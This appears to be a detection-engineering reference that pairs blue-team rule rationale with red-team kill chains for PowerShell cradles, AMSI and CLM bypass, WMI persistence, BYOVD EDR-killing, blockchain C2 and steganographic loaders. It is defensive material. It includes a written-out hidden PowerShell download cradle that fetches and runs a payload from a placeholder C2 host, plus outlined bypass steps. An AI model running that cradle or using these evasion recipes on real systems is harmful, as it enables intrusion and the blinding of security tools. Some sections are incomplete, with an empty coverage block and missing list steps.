🔵 CORE BASELINE COMPOSITE
PowerShell Intent-First Composite — Encoded/Obfuscated Execution Anchor
📎 INSERT RULE LINK · KQL composite · Sentinel + MDE
🔵 BLUE TEAM — Why this composite exists
PowerShell is the attacker's native tongue on Windows. The minimum truth anchor is intent-first: encoded or obfuscated parameters are structurally anomalous regardless of payload content. A legitimate administrator does not base64-encode routine scripts.

The composite anchors on -EncodedCommand, -enc, -e flags combined with parent process context (Office apps, WMI, scheduled tasks spawning PowerShell). Reinforcement signals: network connections immediately post-execution, AMSI bypass strings, download cradles (IEX, Invoke-Expression, Net.WebClient). Cumulative scoring prevents single-signal noise triggering while ensuring chains are caught.
🔴 RED TEAM — How attackers deploy this
PowerShell is the entry point of choice for commodity and APT actors alike because it's signed, trusted, and provides direct .NET access. The kill chain position is typically Initial Access → Execution via phishing macro or Post-Exploitation via lateral movement.

Real-world chain: Phishing email → malicious Office macro → powershell.exe -enc [base64 payload] → download cradle pulls stageless Cobalt Strike beacon from C2 → in-memory reflective injection. No file ever touches disk.

Encoding is used because: (1) bypasses naive string-matching AV, (2) obscures C2 URLs from proxy logs, (3) evades email gateway inspection.

🔵 BLUE TEAM — Detection rationale
Cousin to the encoding anchor. Targets IEX (New-Object Net.WebClient).DownloadString and Invoke-WebRequest cradles. These are the delivery mechanism for stageless payloads. The minimum truth here is a PowerShell process initiating an outbound HTTP/HTTPS connection to a non-corporate domain immediately after spawn. Reinforcement: process spawn anomaly (Office parent), domain age <30 days, JA3 hash anomaly.
🔴 RED TEAM — When, why and how
When deployed: Stage 2 of execution chain after initial foothold. The attacker has code running but needs their full toolkit.

Why this technique: Living off the land — PowerShell's Net.WebClient is a signed Microsoft class. No additional tools needed. The payload never touches disk; it executes entirely in memory via IEX.

Full attacker chain:
1. Macro drops a one-liner: powershell -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('https://[C2]/payload.ps1')"
2. Payload pulls Cobalt Strike shellcode, injects into notepad.exe via VirtualAllocEx/WriteProcessMemory
3. Beacon establishes HTTPS C2 — appears as normal browser traffic

AMSI Bypass Detection
T1562.001 · T1059.001
▼
📎 INSERT RULE LINK
⚡ KILL CHAIN: Defense Evasion → Execution
🔵 BLUE TEAM — Detection rationale
AMSI (Antimalware Scan Interface) is the hook Windows uses to pass script content to AV engines. Bypassing it is a prerequisite for any sophisticated in-memory PowerShell attack. Minimum truth: any PowerShell process writing to amsi.dll memory space, or Script Block Logging capturing known bypass strings (AmsiUtils, amsiInitFailed, reflection-based patching). This cousin catches the prerequisite, not just the payload — structurally upstream of the actual malicious execution.
🔴 RED TEAM — When, why and how
Why attackers bypass AMSI: Without bypassing AMSI, Empire, PowerSploit, and Cobalt Strike PS payloads get caught by Windows Defender immediately on execution — even if the script is in memory.

Standard bypass technique: Reflection patching — using .NET reflection to locate AmsiScanBuffer in memory and patch it to always return AMSI_RESULT_CLEAN. Executes in ~3 lines of PowerShell.

Kill chain position: Always executed BEFORE the actual payload — it's the unlocking step that enables everything else. If you catch the bypass, you catch the attacker preparing, not just acting.

PowerShell Constrained Language Mode Bypass
T1059.001 · T1562
▼
📎 INSERT RULE LINK
⚡ KILL CHAIN: Defense Evasion → Execution
🔵 BLUE TEAM — Detection rationale
Constrained Language Mode (CLM) restricts PowerShell to safe operations — blocking .NET type access, COM objects, and many execution primitives. Detecting bypass attempts catches attackers trying to downgrade to an unrestricted execution environment. Monitor for __PSLockdownPolicy environment variable manipulation, powershell_ise.exe spawning, and WDAC policy tampering.
🔴 RED TEAM — When, why and how
The problem attackers face: Enterprise environments increasingly enforce CLM via AppLocker or WDAC. This blocks most PowerShell offensive toolkits.

Bypass chain: Attackers find a COM object or trusted binary that invokes PowerShell in FullLanguage mode, or exploit the __PSLockdownPolicy environment variable (can be set per-process). MSBuild.exe and InstallUtil.exe are classic trusted-binary bypasses that invoke .NET directly, sidestepping CLM entirely.

WMI Process Spawn Substrate Anchor — Provider Host Anomaly
📎 INSERT RULE LINK · KQL composite · Sentinel + MDE
🔵 BLUE TEAM — Why substrate-first matters here
WMI is the quintessential substrate-first detection problem. No command line is visible — WmiPrvSE.exe spawns child processes that appear to have no parent relationship to the attacker's tool. The minimum truth is WmiPrvSE.exe spawning any interactive process: cmd.exe, powershell.exe, cscript.exe, or any executable outside system32 with no legitimate administrative justification.

Reinforcement: WMI subscription creation events (FilterToConsumerBinding), network connections from WmiPrvSE, process injection into WmiPrvSE. The 30-day atomic primitive index catches staged WMI subscriptions that fire days after creation — defeating temporal deception by tracking the subscription create event independently of the execution event.
🔴 RED TEAM — Why WMI is a favourite
WMI is the attacker's fileless persistence and execution holy grail. It's a signed Windows component, runs as SYSTEM, and historically generated almost no detectable telemetry.

Attack chain (APT-style):
1. Initial foothold established via phishing/exploit
2. Attacker creates WMI Event Filter (trigger: system uptime > 5 min)
3. Attacker creates WMI Event Consumer (action: execute PowerShell download cradle)
4. FilterToConsumerBinding links them
5. On every reboot, 5 minutes after startup, payload executes — no scheduled task, no registry run key, no file on disk

Why it evades: Process creation shows WmiPrvSE.exe as parent. Many SIEMs have WmiPrvSE whitelisted. No script file exists to scan.

🔵 BLUE TEAM
Run key writes are noisy — legitimate software uses them constantly. The minimum truth composite anchors on path anomaly: run key values pointing to executables in TEMP, AppData, ProgramData, or user-writable paths. BYOVD — Bring Your Own Vulnerable Driver
DEFENSE EVASION · PRIVILEGE ESCALATION · SUBSTRATE-FIRST
▼
🔵 CORE BASELINE COMPOSITE
BYOVD Driver Load + EDR Kill Chain Composite — SilverFox/ValleyRAT Aligned
📎 INSERT RULE LINK · See Novel Research tab for full SilverFox rules
🔵 BLUE TEAM
BYOVD is the apex defense evasion technique: load a legitimate but vulnerable signed driver to gain kernel-level code execution, then use that to kill EDR processes or disable kernel callbacks that EDR relies on.

Minimum truth composite: signed driver loaded from non-system path + kernel callback deregistration attempt OR driver service creation by non-system process + immediate process termination of security product. The 30-day primitive index tracks driver drops independently — a driver dropped and staged is caught even if execution is delayed by days (BYOVD staging pattern).

LOLDRIVER composite cross-references against MISP supply chain feed of known vulnerable driver hashes.
🔴 RED TEAM
Why BYOVD? EDR products run protected processes at kernel level. User-space tools cannot kill them. BYOVD bypasses this by exploiting a kernel vulnerability to gain ring-0 execution — from which you can terminate any process, disable callbacks, and operate invisibly.

Full SilverFox/ValleyRAT chain (MTDF original research):
1. Signed loader drops vulnerable driver (e.g., gdrv.sys, iqvw64e.sys)
2. Loader exploits driver vulnerability to execute kernel shellcode
3. Kernel shellcode deregisters EDR process-creation callbacks
4. EDR is now blind — subsequent payloads execute without detection
5. BYOVD driver unloaded to reduce footprint
6. ValleyRAT/SilverFox RAT installed with full persistence

Byte-Flip Driver Mutation — Hash Evasion
T1027 · T1068
▼
📎 INSERT RULE LINK
⚡ KILL CHAIN: Defense Evasion → Privilege Escalation
🔵 BLUE TEAM
Attackers mutate known-vulnerable drivers by flipping bytes in non-critical sections to change the file hash while preserving functionality. Hash-based IOC detection is completely defeated. The composite shifts from hash-matching to behaviour-based substrate detection: driver signing certificate thumbprint (the vulnerable driver's cert is still valid), driver name patterns, and immediately-post-load kernel callback behaviour. The problem this solves for attackers: Defenders publish IOC lists of known vulnerable driver hashes (LOLBAS project, MITRE). Why this is part of MTDF original research: Standard detection relies on hash lists. MTDF's cousin rule detects the exploit behaviour at the kernel callback level — immune to hash mutation.

SilverFox / ValleyRAT — BYOVD Kill Chain
▼
🔵 DETECTION COVERAGE — 7 Rules, 3 Tiers
Tier 1 — Stager Detection: Signed loader anomaly (legitimate cert, suspicious path/parent), DLL sideload of ValleyRAT initial stager, PE loaded from user-writable path with high-entropy section.

Tier 2 — BYOVD Chain: Vulnerable driver drop + service creation composite, kernel callback deregistration attempt (via DeviceIoControl to driver handle), EDR process termination following driver load.

Tier 3 — RAT Persistence: ValleyRAT module injection into system process, C2 beaconing pattern (periodic HTTPS with specific JA3 profile), byte-flip mutation defence via certificate thumbprint rather than hash matching.
🔴 FULL KILL CHAIN — Hacker Perspective
Actor: Chinese-nexus threat group. Targets: finance, crypto, enterprise Windows environments.

Stage 1: Phishing delivers signed loader binary (legitimate certificate, custom packer). Loader performs DLL sideloading — drops malicious DLL alongside legitimate signed application.

Stage 2: Sideloaded DLL drops vulnerable kernel driver (e.g., gdrv.sys). Exploits driver to gain ring-0 execution. Deregisters EDR kernel callbacks (PsSetCreateProcessNotifyRoutine, ObRegisterCallbacks). EDR is blind.

Stage 3: With EDR neutralised, ValleyRAT RAT deployed with full persistence. Byte-flipping applied to driver binary to defeat hash-based IOC blocking. C2 established over HTTPS.

Why signature-based controls fail: Signed loader (cert trusted), LOLBin sideload (known-good app), vulnerable driver (Microsoft-signed), mutated hash (no IOC match), encrypted C2 (no payload inspection). Seven distinct evasion layers.

EtherRAT / React2Shell — Blockchain C2 (CVE-2025-55182)
▼
🔵 DETECTION COVERAGE

🔴 FULL KILL CHAIN — Why Blockchain C2 Is a Step Change
The innovation: C2 commands are embedded in Ethereum blockchain transactions (in the input data field of a transaction to a smart contract). The RAT polls a public blockchain explorer API — there is no C2 server to sinkhole, no domain to block, no IP to blacklist.

Attack chain:
1. React2Shell exploit (CVE-2025-55182) delivers EtherRAT via IIS exploitation

4. RAT decodes command from public blockchain — executes — encodes response in a new transaction
5. Entire C2 channel runs over public internet infrastructure that cannot be taken down

Why this defeats traditional C2 detection: No malicious domain. No suspicious IP. HTTPS to Infura.io (legitimate Ethereum infrastructure). The C2 infrastructure is the Ethereum blockchain itself.

NOVEL RESEARCH #3
Steganographic Loader Ecosystem — Image-Based Payload Delivery
▼
🔵 DETECTION COVERAGE — Multi-Phase
Phase 1 — Image Inspection: Stego-Image-Loader.kql — detects anomalous image file access patterns: image files opened by scripting engines (PowerShell, VBScript), image files loaded into executable memory regions, image files with anomalous entropy in LSB layers (statistical detection).

Phase 2 — Memory Indicators: Stego_NET_In_Memory_Hunt.kql — .NET assembly loaded from memory region that originated from image file read operation. Shellcode execution following image file parse.

Phase 3 — IR SOP: Full incident response procedure for stego-loader compromise — evidence collection, IOC extraction from image files, memory forensics procedure.
🔴 FULL KILL CHAIN — Steganography as Evasion
The technique: Malicious payload encoded in the least-significant bits (LSB) of a legitimate-looking image file (PNG/BMP). The image passes all AV/DLP inspection — it is a valid image with correct headers, displays normally, has no embedded PE signature.

Delivery chain:
1. Phishing email/compromised site delivers image file (appears as banner/logo/attachment)
2. Dropper script opens image, reads pixel data, extracts LSB-encoded payload
3. Payload decoded to shellcode/PE — loaded directly into memory (never written to disk)
4. Shellcode executes — delivers next stage RAT or beacon

Why it evades: No malicious file ever exists on disk. Image passes all signature scanning. Network DLP sees a legitimate image download. The only detection surface is the anomalous behaviour of the script reading image pixel data and executing the result.
